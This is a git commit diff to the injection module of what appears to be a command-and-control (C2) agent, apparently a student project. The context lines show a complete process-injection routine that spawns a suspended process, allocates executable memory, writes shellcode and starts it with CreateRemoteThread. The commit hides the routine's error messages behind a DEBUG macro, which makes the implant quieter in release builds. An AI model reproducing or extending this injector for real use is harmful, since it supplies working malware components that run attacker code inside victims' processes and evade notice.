b3185fbd185ab80fd25839971e6076ce2312ce85
mint <n.sogutlu@student.fontys.nl>
2025-01-06 10:00:21 +0100

    add debug macros checks

--- c2/agent/src/modules/src/injections.c
+++ c2/agent/src/modules/src/injections.c
@@ -12,20 +12,26 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
     ZeroMemory(&pi, sizeof(pi));
 
     if (!CreateProcessA(lpApplicationName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        #ifdef DEBUG
         printf("CreateProcess failed (%d).\n", GetLastError());
+        #endif
         return;
     }
 
     LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (remoteMemory == NULL) {
+        #ifdef DEBUG
         printf("VirtualAllocEx failed (%d).\n", GetLastError());
+        #endif
         TerminateProcess(pi.hProcess, 1);
         return;
     }
 
     SIZE_T bytesWritten;
     if (!WriteProcessMemory(pi.hProcess, remoteMemory, shellcode, dwShellcodeSize, &bytesWritten)) {
+        #ifdef DEBUG
         printf("WriteProcessMemory failed (%d).\n", GetLastError());
+        #endif
         VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
         TerminateProcess(pi.hProcess, 1);
         return;
@@ -33,7 +39,9 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
 
     HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
     if (hThread == NULL) {
+        #ifdef DEBUG
         printf("CreateRemoteThread failed (%d).\n", GetLastError());
+        #endif
         VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
         TerminateProcess(pi.hProcess, 1);
         return;
